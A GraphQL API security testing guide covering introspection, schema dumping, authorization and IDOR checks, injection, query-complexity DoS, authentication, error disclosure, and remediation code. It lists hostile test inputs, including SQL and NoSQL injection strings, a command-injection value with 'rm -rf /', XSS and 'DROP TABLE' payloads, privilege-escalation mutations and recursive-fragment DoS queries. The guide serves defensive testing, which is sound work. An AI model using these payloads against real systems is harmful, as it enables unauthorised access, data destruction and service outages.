# GraphQL API Security Testing Guide

## Overview

GraphQL is a query language for APIs that allows clients to request exactly what data they need. Security testing for GraphQL differs from REST APIs due to its unique features: introspection, aliases, fragments, batching, and complex query execution.

---

## 1. Introspection Testing

### Detecting Introspection Enabled

**Description:** Introspection allows querying the GraphQL schema structure. Enabled in production is a security risk.

**Basic Introspection Query:**
```graphql
{
  __schema {
    types {
      name
      kind
    }
  }
}
```

**Curl Command:**
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
```

**Full Introspection Dump:**
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery { __schema { types { name kind description fields { name type { name kind } } } } }"}'
```

**Using graphql-core (Python):**
```python
import requests
from graphql import get_introspection_query

query = get_introspection_query()
response = requests.post(
    'https://target.com/graphql',
    json={'query': query}
)
print(response.json())
```

**Expected Output (Vulnerable):**
```json
{
  "data": {
    "__schema": {
      "types": [
        {"name": "Query", "kind": "OBJECT"},
        {"name": "User", "kind": "OBJECT"},
        {"name": "Post", "kind": "OBJECT"},
        ...
      ]
    }
  }
}
```

**If Introspection Disabled:**
```json
{
  "errors": [
    {
      "message": "GraphQL introspection is disabled, but the requested query contains the field '__schema'."
    }
  ]
}
```

---

## 2. Schema Enumeration

### Enumerate Queries, Mutations, Subscriptions

**Description:** Once introspection is enabled, fully dump the schema to understand available operations.

**Query to Get All Query Operations:**
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type { name kind }
        }
        type {
          name
          kind
        }
      }
    }
  }
}
```

**Query to Get All Mutations:**
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        description
        args {
          name
          type { name kind }
        }
      }
    }
  }
}
```

**Query to Get All Subscriptions:**
```graphql
{
  __schema {
    subscriptionType {
      fields {
        name
        description
      }
    }
  }
}
```

**Get Full Type Details:**
```graphql
{
  __type(name: "User") {
    name
    kind
    fields {
      name
      type { name kind ofType { name kind } }
      args { name type { name } }
    }
    possibleTypes {
      name
    }
  }
}
```

**Tools for Automated Dumping:**

InQL (Burp Extension):
```bash
# Download from: https://github.com/doyensec/inql
# Automatically enumerates and saves schema
```

GraphQL CLI:
```bash
npm install -g graphql-cli
graphql endpoint https://target.com/graphql
graphql get-schema
```

---

## 3. Authorization & Access Control Testing

### Test Field-Level Authorization

**Description:** GraphQL may expose fields that should be restricted based on user role.

**Test: Access Protected Fields Without Authorization**
```graphql
{
  user(id: 1) {
    id
    name
    email
    ssn      # Should be restricted to admin
    salary   # Should be restricted to admin
    password # Should never be exposed
  }
}
```

**Test: Access Other User's Data (IDOR)**
```graphql
{
  user(id: 2) {
    id
    name
    email
    privateMessages
  }
}
```

**Test: Mutation Authorization (Should fail without admin role)**
```graphql
mutation {
  deleteUser(id: 999) {
    success
    message
  }
}
```

**Test: Bypass Authorization via Alias**
```graphql
{
  myData: user(id: 1) {
    id
    name
  }
  adminData: user(id: 2) {
    id
    name
    email
  }
}
```

**Expected Output (Vulnerable):**
```json
{
  "data": {
    "user": {
      "id": 2,
      "name": "Admin User",
      "email": "admin@target.com",
      "ssn": "123-45-6789",
      "salary": 150000,
      "password": "hashed_password"
    }
  }
}
```

---

## 4. Injection Attacks

### GraphQL Injection

**Description:** GraphQL queries can be subject to injection if user input is not properly sanitized.

**SQL Injection via GraphQL:**
```graphql
{
  user(name: "admin' OR '1'='1") {
    id
    name
  }
}
```

**NoSQL Injection:**
```graphql
{
  user(name: {"$regex": ".*"}) {
    id
    name
  }
}
```

**Command Injection:**
```graphql
{
  search(query: "; rm -rf /; #") {
    results
  }
}
```

**LDAP Injection:**
```graphql
{
  user(filter: "*") {
    id
    name
  }
}
```

**Test Using Variables (Often Safer, Less Vulnerable):**
```graphql
query SearchUser($name: String!) {
  user(name: $name) {
    id
    name
  }
}
```

With variables:
```json
{
  "query": "query SearchUser($name: String!) { user(name: $name) { id name } }",
  "variables": {
    "name": "admin' OR '1'='1"
  }
}
```

---

## 5. Query Complexity & DoS Testing

### Query Depth Limit Bypass

**Description:** Deep nested queries can cause performance issues or DoS.

**Test: Deep Nesting**
```graphql
{
  user {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                # ... continue nesting
              }
            }
          }
        }
      }
    }
  }
}
```

**Test: Large Query with Many Fields**
```graphql
{
  users {
    id name email phone address
    posts { id title content }
    comments { id text author { id name } }
    favorites { id }
    settings { id }
    # ... repeat for many fields
  }
}
```

**Test: Alias Expansion (Query Batching)**
```graphql
{
  a: user(id: 1) { id name }
  b: user(id: 2) { id name }
  c: user(id: 3) { id name }
  d: user(id: 4) { id name }
  e: user(id: 5) { id name }
  # ... repeat 1000s of times
}
```

**Test: Recursive Fragment DoS**
```graphql
fragment Recursion on User {
  id
  name
  friends {
    ...Recursion
  }
}

{
  user {
    ...Recursion
  }
}
```

**Expected Output (Vulnerable):**
- Timeout or very slow response (>5 seconds)
- High CPU/memory usage
- Server crash or hang

**Tools for Query Complexity Analysis:**
```bash
# GraphQL Complexity Calculator
npm install --save graphql-query-complexity

# Usage in server code
const { getComplexity, simpleEstimator } = require('graphql-query-complexity');

const complexity = getComplexity({
  schema,
  query: parsedQuery,
  estimators: [simpleEstimator({ defaultComplexity: 1 })]
});

if (complexity > MAX_COMPLEXITY) {
  throw new Error('Query too complex');
}
```

---

## 6. Authentication Bypass Testing

### Test: Unauthenticated Access to Protected Queries

**Description:** Some fields/queries should require authentication.

```graphql
{
  currentUser {
    id
    name
    email
  }
}
```

**If Unauthenticated Access Succeeds:**
```json
{
  "data": {
    "currentUser": {
      "id": 1,
      "name": "User",
      "email": "user@target.com"
    }
  }
}
```

**Vulnerable**: Should require authentication token.

### Test: Token/Session Validation

```bash
# Test with invalid token
curl -X POST https://target.com/graphql \
  -H "Authorization: Bearer invalid_token" \
  -H "Content-Type: application/json" \
  -d '{"query":"{currentUser{id name}}"}'

# Test with expired token
curl -X POST https://target.com/graphql \
  -H "Authorization: Bearer expired_token" \
  -H "Content-Type: application/json" \
  -d '{"query":"{currentUser{id name}}"}'

# Test with no token
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{currentUser{id name}}"}'
```

---

## 7. Mutation Testing

### Dangerous Mutations

**Description:** Test mutations for authorization and input validation.

**Test: Privilege Escalation via Mutation**
```graphql
mutation {
  updateUser(id: 1, role: "ADMIN") {
    id
    role
  }
}
```

**Test: Delete Operations**
```graphql
mutation {
  deletePost(id: 123) {
    success
  }
}
```

**Test: Bulk Operations**
```graphql
mutation {
  deleteUsers(ids: [1, 2, 3, 4, 5]) {
    success
    deletedCount
  }
}
```

**Test: Mutation with Malicious Input**
```graphql
mutation {
  createPost(
    title: "<script>alert(1)</script>"
    content: "'; DROP TABLE users; --"
  ) {
    id
    title
    content
  }
}
```

---

## 8. Information Disclosure

### Error-Based Information Disclosure

**Description:** Error messages may reveal sensitive information.

**Test: Invalid Query**
```graphql
{
  user {
    nonexistent_field
  }
}
```

**Vulnerable Response:**
```json
{
  "errors": [
    {
      "message": "Cannot query field 'nonexistent_field' on type 'User'",
      "extensions": {
        "exception": {
          "stacktrace": [
            "at Object.getFieldDef (/home/app/node_modules/graphql/index.js:1234:56)",
            "at /home/app/server.js:1456:78"
          ]
        }
      }
    }
  ]
}
```

**Safe Response:** Should not include stacktraces or file paths.

### Test: Stack Trace Exposure

```graphql
{
  user(id: "invalid") {
    id
  }
}
```

If error includes full stack trace → information disclosure.

---

## 9. Testing Tools & Commands

### Using curl

```bash
# Simple query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{user{id name}}"}'

# With authentication
curl -X POST https://target.com/graphql \
  -H "Authorization: Bearer token123" \
  -H "Content-Type: application/json" \
  -d '{"query":"{user{id name}}"}'

# With variables
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query GetUser($id: Int!) { user(id: $id) { id name } }",
    "variables": { "id": 1 }
  }'
```

### Using Altair GraphQL Client

```
1. Download: https://altair.sirmuel.design/
2. Paste GraphQL endpoint URL
3. Click "Docs" to auto-discover schema
4. Build and test queries in editor
5. View full introspection results
```

### Using Nuclei

```bash
# Test for common GraphQL vulns
nuclei -u https://target.com/graphql -t cves/graphql/ -v

# Download GraphQL templates
nuclei -u https://target.com/graphql \
  -t nuclei-templates/graphql-introspection.yaml
```

### Using GraphQL CLI

```bash
# Install
npm install -g graphql-cli

# Connect to endpoint
graphql endpoint https://target.com/graphql

# Download schema
graphql get-schema

# Save schema locally
graphql get-schema --output schema.graphql

# Introspection info
graphql introspect
```

### Using InQL (Burp Suite)

```
1. Install extension from: https://github.com/doyensec/inql
2. Load target GraphQL endpoint
3. Automatically enumerated schema
4. View all queries, mutations, subscriptions
5. Generate test payloads
```

---

## 10. Common Vulnerabilities Checklist

### Security Issues to Look For

- [ ] Introspection enabled in production
- [ ] No query depth/complexity limits
- [ ] No authentication on sensitive queries
- [ ] No authorization checks on mutations
- [ ] Field-level access control missing
- [ ] Injection vulnerabilities (SQL, NoSQL, LDAP)
- [ ] Information disclosure in error messages
- [ ] Stack traces exposed in responses
- [ ] No rate limiting on queries
- [ ] Alias expansion/batching DoS possible
- [ ] No input validation on mutations
- [ ] XSS possible in fields (unescaped HTML)
- [ ] CSRF possible on mutations (no token validation)
- [ ] File upload mutations without validation
- [ ] Recursive queries/fragments not blocked

---

## 11. Remediation Recommendations

**Disable Introspection in Production:**
```javascript
// Apollo Server
const server = new ApolloServer({
  schema,
  introspection: false,  // Disable in production
  plugins: {
    // ...
  }
});
```

**Implement Query Complexity Analysis:**
```javascript
const { getComplexity, simpleEstimator } = require('graphql-query-complexity');

server.use((req, res, next) => {
  const complexity = getComplexity({
    schema,
    query: req.body.query,
    estimators: [simpleEstimator({ defaultComplexity: 1 })]
  });
  
  if (complexity > 1000) {
    res.status(400).json({ error: 'Query too complex' });
  }
  next();
});
```

**Implement Rate Limiting:**
```javascript
// Use express-rate-limit or similar
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

app.use('/graphql', limiter);
```

**Validate Input:**
```graphql
scalar Email

type Query {
  user(email: Email!): User
}
```

**Implement Field-Level Authorization:**
```javascript
const user = {
  id: 1,
  name: 'User',
  email: 'user@target.com',
  // Only resolve if user is admin
  ssn: (parent, args, context) => {
    if (!context.user.isAdmin) {
      throw new Error('Not authorized');
    }
    return parent.ssn;
  }
};
```

---

## 12. Test Summary

| Test | Risk | Check |
|------|------|-------|
| Introspection Enabled | High | Can enumerate entire schema |
| Deep Query Nesting | Medium | DoS via nested queries |
| Alias Expansion | Medium | DoS via batching |
| Unauthenticated Access | Critical | Access protected data |
| IDOR in Queries | High | Access other users' data |
| Injection in Fields | High | SQL/NoSQL/LDAP injection |
| Mutation Authorization | High | Privilege escalation |
| Error Information Disclosure | Medium | Stack traces, paths exposed |
| Missing Input Validation | High | XSS, injection |
| Rate Limiting | Medium | Brute force, DoS |

---

## 13. Resources

- **GraphQL Security Best Practices:** https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- **GraphQL Security Guide:** https://spec.graphql.org/June2018/#sec-Introspection
- **OWASP Testing Guide (Adapted for GraphQL):** https://owasp.org/www-project-web-security-testing-guide/
- **GraphQL Tutorials:** https://graphql.org/learn/
- **Apollo Server Security:** https://www.apollographql.com/docs/apollo-server/security/authentication/

---

**Last Updated:** 2026-03-18  
**Scope:** GraphQL API Security Testing for OWASP WSTG v4.2 (adapted)
